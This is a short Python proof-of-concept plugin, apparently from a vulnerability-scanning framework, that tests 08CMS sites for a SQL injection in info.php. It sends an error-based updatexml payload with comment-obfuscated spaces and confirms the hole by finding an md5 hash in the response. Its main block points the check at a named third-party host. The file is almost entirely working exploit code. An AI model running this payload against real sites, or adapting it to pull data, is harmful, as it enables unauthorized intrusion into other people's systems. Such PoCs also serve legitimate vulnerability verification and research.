#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-0110861
#__Author__ = 上善若水
#_PlugName_ = 08CMS_sql Plugin
#_FileName_ = 08CMS_sql.py
from ..miniCurl import Curl
from ..t  import T


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        url = arg + "info.php?fid=1&tblprefix=cms_msession" 
        payload = "/**/where/**/1/**/and/**/updatexml(1,concat(0x37,(select/**/md5(520)/**/limit/**/0,1)),1)%23" 
        geturl = url + payload
        code, head, body, errcode, final_url = curl.curl2(geturl,cookie="umW_msid=rsLQWU")
        if code == 200 and 'cf67355a3333e6e143439161adc2d82e' in body:
            output(url,result,'hole')
        

        del curl
        return result


def output(url,result,label):
    info = url + '  08cms  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='08cms Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/08cms/08cms_1d42d5fc5efdd2ecbf8157a1bf1ac292.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/08cms/08cms_1d42d5fc5efdd2ecbf8157a1bf1ac292.py
#/root/github/poccreate/codesrc/exp-885.py